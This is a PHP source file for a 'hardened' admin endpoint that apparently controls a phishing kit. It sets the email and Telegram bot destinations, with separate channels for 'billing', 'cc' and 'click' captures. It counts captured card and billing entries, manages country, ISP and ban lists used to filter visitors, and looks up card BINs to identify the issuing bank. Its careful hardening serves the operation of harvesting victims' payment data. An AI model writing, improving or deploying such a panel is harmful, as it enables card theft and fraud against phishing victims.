<?php
declare(strict_types=1);

/**
 * base.php — hardened admin endpoint for settings/stats
 * - Secure session (HTTP-only, same-site)
 * - Authentication using password_hash/verify
 * - CSRF token
 * - Atomic & locked JSON read/write
 * - Strict input validation
 * - Minimal, safe cURL with timeout for binCheck()
 *
 * NOTE: Prefer placing config files OUTSIDE webroot.
 */

//// 0) Security headers (adjust to your app’s needs)
header('X-Content-Type-Options: nosniff');
header('X-Frame-Options: SAMEORIGIN');
header('Referrer-Policy: no-referrer');
header('Content-Security-Policy: default-src \'self\'');

//// 1) Constants & paths
const CONFIG_DIR = __DIR__ . '/help/!#'; // adjust if needed
const SETTINGS_PATH = CONFIG_DIR . '/settings.json';
const ISPS_PATH     = CONFIG_DIR . '/isps.json';

if (!is_dir(CONFIG_DIR)) {
    http_response_code(500);
    exit('Config directory missing.');
}

//// 2) Hardened session
$cookieParams = session_get_cookie_params();
session_set_cookie_params([
    'lifetime' => 0,
    'path'     => $cookieParams['path'] ?? '/',
    'domain'   => $cookieParams['domain'] ?? '',
    'secure'   => isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off',
    'httponly' => true,
    'samesite' => 'Strict',
]);
session_start();

//// 3) Helpers

function json_load(string $path): array {
    if (!is_readable($path)) return [];

    $fh = fopen($path, 'rb');
    if (!$fh) throw new RuntimeException('Failed to open file: ' . basename($path));
    try {
        if (!flock($fh, LOCK_SH)) throw new RuntimeException('Lock failed (read).');
        $raw = stream_get_contents($fh);
        flock($fh, LOCK_UN);
    } finally {
        fclose($fh);
    }

    if ($raw === false) throw new RuntimeException('Read failed: ' . basename($path));
    $data = json_decode($raw, true, 512, JSON_THROW_ON_ERROR);
    return is_array($data) ? $data : [];
}

function json_save(string $path, array $data): void {
    $dir = dirname($path);
    if (!is_dir($dir) && !mkdir($dir, 0775, true)) {
        throw new RuntimeException('Failed to create config dir.');
    }

    $tmp = tempnam($dir, 'cfg_');
    if ($tmp === false) throw new RuntimeException('tempnam failed.');
    $json = json_encode($data, JSON_THROW_ON_ERROR | JSON_UNESCAPED_SLASHES | JSON_PRETTY_PRINT);

    $fh = fopen($tmp, 'wb');
    if (!$fh) throw new RuntimeException('Failed to open temp file.');
    try {
        if (!flock($fh, LOCK_EX)) throw new RuntimeException('Lock failed (write).');
        if (fwrite($fh, $json) === false) throw new RuntimeException('Write failed.');
        fflush($fh);
        flock($fh, LOCK_UN);
    } finally {
        fclose($fh);
    }

    if (!rename($tmp, $path)) {
        @unlink($tmp);
        throw new RuntimeException('Atomic rename failed.');
    }
}

/** Ensure a field exists in array */
function arr_get(array $a, array $path, $default = null) {
    foreach ($path as $k) {
        if (!is_array($a) || !array_key_exists($k, $a)) return $default;
        $a = $a[$k];
    }
    return $a;
}

/** CSRF */
function csrf_token(): string {
    if (empty($_SESSION['csrf'])) {
        $_SESSION['csrf'] = bin2hex(random_bytes(32));
    }
    return $_SESSION['csrf'];
}
function csrf_check(?string $t): void {
    if (!$t || !hash_equals($_SESSION['csrf'] ?? '', $t)) {
        http_response_code(403);
        exit('Invalid CSRF token.');
    }
}

/** Require auth */
function require_auth(): void {
    if (!($_SESSION['logged_in'] ?? false)) {
        http_response_code(401);
        exit('Not authenticated.');
    }
}

/** Basic field sanitizer helpers */
function str_safe(string $s, int $max = 256): string {
    $s = trim($s);
    if (strlen($s) > $max) $s = substr($s, 0, $max);
    return $s;
}
function bool_safe($v): bool {
    return filter_var($v, FILTER_VALIDATE_BOOL, FILTER_NULL_ON_FAILURE) ?? false;
}

/** External lookup with cURL + timeout */
function binCheck(string $bin): string {
    $bin = preg_replace('/\D/', '', $bin);
    if ($bin === '' || strlen($bin) < 6 || strlen($bin) > 8) return '';

    // Simple session cache to reduce queries
    $_SESSION['bin_cache'] ??= [];
    if (isset($_SESSION['bin_cache'][$bin])) return $_SESSION['bin_cache'][$bin];

    $ch = curl_init('https://lookup.binlist.net/' . $bin);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 3,
        CURLOPT_CONNECTTIMEOUT => 2,
        CURLOPT_FOLLOWLOCATION => false,
        CURLOPT_HTTPHEADER     => ['Accept-Version: 3'],
    ]);
    $resp = curl_exec($ch);
    $status = curl_getinfo($ch, CURLINFO_RESPONSE_CODE);
    curl_close($ch);

    if ($resp === false || $status !== 200) return '';

    try {
        $data = json_decode($resp, true, 512, JSON_THROW_ON_ERROR);
    } catch (Throwable) {
        return '';
    }

    $vendor = (string)($data['scheme'] ?? '');
    $type   = (string)($data['type'] ?? '');
    $level  = (string)($data['level'] ?? '');
    $bank   = (string)arr_get($data, ['bank', 'name'], '');

    $result = "{$vendor}|{$type}|{$level}|{$bank}";
    $_SESSION['bin_cache'][$bin] = $result;
    // prevent unbounded growth
    if (count($_SESSION['bin_cache']) > 200) array_shift($_SESSION['bin_cache']);
    return $result;
}

//// 4) Load config (once)
try {
    $config = json_load(SETTINGS_PATH);
} catch (Throwable $e) {
    http_response_code(500);
    exit('Failed to load settings.');
}

//// 5) Auth flow (login/logout) — password stored hashed in settings.json at settings.password
$method = $_SERVER['REQUEST_METHOD'] ?? 'GET';

if ($method === 'POST' && isset($_POST['action']) && $_POST['action'] === 'login') {
    csrf_check($_POST['csrf'] ?? null);
    $passwordHash = (string) arr_get($config, ['settings', 'password'], '');
    $passwordTry  = $_POST['password'] ?? '';

    if ($passwordHash && password_verify($passwordTry, $passwordHash)) {
        $_SESSION['logged_in'] = true;
        // rotate CSRF after privilege change
        $_SESSION['csrf'] = bin2hex(random_bytes(32));
        exit('OK');
    }
    http_response_code(403);
    exit('Invalid credentials.');
}

if ($method === 'POST' && isset($_POST['action']) && $_POST['action'] === 'logout') {
    csrf_check($_POST['csrf'] ?? null);
    session_destroy();
    exit('OK');
}

//// 6) Write operations — require auth + CSRF
if ($method === 'POST' && isset($_POST['action'])) {
    require_auth();
    csrf_check($_POST['csrf'] ?? null);

    try {
        switch ($_POST['action']) {
            // --- Update sending data (email + telegram) & settings toggle ---
            case 'update_sending_and_settings': {
                $email            = str_safe($_POST['email'] ?? '', 320);
                $token            = str_safe($_POST['token'] ?? '', 256);
                $chatid           = str_safe($_POST['chatid'] ?? '', 64);
                $chatidbilling    = str_safe($_POST['chatidbilling'] ?? '', 64);
                $chatidcc         = str_safe($_POST['chatidcc'] ?? '', 64);
                $chatidclick      = str_safe($_POST['chatidclick'] ?? '', 64);

                $panel            = bool_safe($_POST['panel'] ?? false);
                $autoredirect     = bool_safe($_POST['autoredirect'] ?? false);
                $captcha          = bool_safe($_POST['captcha'] ?? false);
                $movement_track   = bool_safe($_POST['movement_track'] ?? false);

                // Load fresh
                $cfg = json_load(SETTINGS_PATH);

                // Update sending
                $cfg['sending']               ??= [];
                $cfg['sending']['email']       = $email;
                $cfg['sending']['telegram']    ??= [];
                $cfg['sending']['telegram']['token']        = $token;
                $cfg['sending']['telegram']['chatid']       = $chatid;
                $cfg['sending']['telegram']['chatidbilling']= $chatidbilling;
                $cfg['sending']['telegram']['chatidcc']     = $chatidcc;
                $cfg['sending']['telegram']['chatidclick']  = $chatidclick;

                // Update settings
                $cfg['settings'] ??= [];
                $cfg['settings']['panel']          = $panel;
                $cfg['settings']['autoredirect']   = $autoredirect;
                $cfg['settings']['captcha']        = $captcha;
                $cfg['settings']['movement_track'] = $movement_track;

                // Optional password change (send empty to clear)
                if (array_key_exists('password', $_POST)) {
                    $newPass = (string)($_POST['password'] ?? '');
                    $cfg['settings']['password'] = $newPass !== ''
                        ? password_hash($newPass, PASSWORD_DEFAULT)
                        : '';
                    // force logout on password update
                    unset($_SESSION['logged_in']);
                }

                json_save(SETTINGS_PATH, $cfg);
                exit('OK');
            }

            // --- Reset stats safely ---
            case 'reset_stats': {
                $cfg = json_load(SETTINGS_PATH);
                $cfg['statistiques'] = [
                    'click'   => 0,
                    'billing' => 0,
                    'cc'      => 0,
                    'other'   => 0,
                ];
                json_save(SETTINGS_PATH, $cfg);
                exit('OK');
            }

            // --- Add operator to country (ISPs) ---
            case 'add_operator': {
                $country  = strtoupper(str_safe($_POST['country'] ?? '', 2));   // e.g., FR, DE
                $operator = str_safe($_POST['operator'] ?? '', 128);

                if ($country === '') {
                    http_response_code(400);
                    exit('country required.');
                }
                $isp = json_load(ISPS_PATH);
                $isp[$country] = array_values(array_filter(array_merge($isp[$country] ?? [], [$operator]), fn($x) => $x !== ''));
                json_save(ISPS_PATH, $isp);
                exit('OK');
            }

            // --- Create empty country entry ---
            case 'add_country': {
                $country = strtoupper(str_safe($_POST['country'] ?? '', 2));
                if ($country === '') {
                    http_response_code(400);
                    exit('country required.');
                }
                $isp = json_load(ISPS_PATH);
                $isp[$country] ??= [];
                json_save(ISPS_PATH, $isp);
                exit('OK');
            }

            // --- Remove country ---
            case 'remove_country': {
                $country = strtoupper(str_safe($_POST['country'] ?? '', 2));
                $isp = json_load(ISPS_PATH);
                unset($isp[$country]);
                json_save(ISPS_PATH, $isp);
                exit('OK');
            }

            // --- Update whitelist/blacklist arrays ---
            case 'update_exceptions': {
                $cfg = json_load(SETTINGS_PATH);
                $cfg['exceptions'] ??= [];

                $wl = $_POST['whitelist'] ?? null;
                $bl = $_POST['banned'] ?? null;

                if (is_array($wl)) {
                    $cfg['exceptions']['whitelist'] = array_values(array_unique(array_map(fn($x)=>str_safe((string)$x,256), $wl)));
                }
                if (is_array($bl)) {
                    $cfg['exceptions']['banned'] = array_values(array_unique(array_map(fn($x)=>str_safe((string)$x,256), $bl)));
                }

                json_save(SETTINGS_PATH, $cfg);
                exit('OK');
            }

            // --- BIN check (read-only helper) ---
            case 'bin_check': {
                $bin = str_safe($_POST['bin'] ?? '', 12);
                $res = binCheck($bin);
                header('Content-Type: application/json');
                echo json_encode(['result' => $res], JSON_UNESCAPED_SLASHES);
                exit;
            }

            default:
                http_response_code(400);
                exit('Unknown action.');
        }
    } catch (Throwable $e) {
        http_response_code(500);
        exit('Server error.');
    }
}

//// 7) Read-only endpoint to expose current config snippets (masked)
if ($method === 'GET' && isset($_GET['action']) && $_GET['action'] === 'status') {
    require_auth();

    try {
        $cfg = json_load(SETTINGS_PATH);
        $out = [
            'statistiques' => [
                'click'   => (int)arr_get($cfg, ['statistiques','click'], 0),
                'billing' => (int)arr_get($cfg, ['statistiques','billing'], 0),
                'cc'      => (int)arr_get($cfg, ['statistiques','cc'], 0),
                'other'   => (int)arr_get($cfg, ['statistiques','other'], 0),
            ],
            'settings' => [
                'panel'          => (bool)arr_get($cfg, ['settings','panel'], false),
                'autoredirect'   => (bool)arr_get($cfg, ['settings','autoredirect'], false),
                'captcha'        => (bool)arr_get($cfg, ['settings','captcha'], false),
                'movement_track' => (bool)arr_get($cfg, ['settings','movement_track'], false),
                'password_set'   => arr_get($cfg, ['settings','password'], '') !== '',
            ],
            'sending' => [
                'email'    => (string)arr_get($cfg, ['sending','email'], ''),
                'telegram' => [
                    'token_masked' => strlen((string)arr_get($cfg, ['sending','telegram','token'], '')) > 6,
                    'chatid'       => (string)arr_get($cfg, ['sending','telegram','chatid'], ''),
                    'chatidbilling'=> (string)arr_get($cfg, ['sending','telegram','chatidbilling'], ''),
                    'chatidcc'     => (string)arr_get($cfg, ['sending','telegram','chatidcc'], ''),
                    'chatidclick'  => (string)arr_get($cfg, ['sending','telegram','chatidclick'], ''),
                ],
            ],
            'csrf' => csrf_token(),
        ];

        header('Content-Type: application/json');
        echo json_encode($out, JSON_UNESCAPED_SLASHES);
        exit;
    } catch (Throwable) {
        http_response_code(500);
        exit('Failed to read status.');
    }
}

//// 8) Fallback – show nothing (or your HTML admin page can include this file)
http_response_code(204);
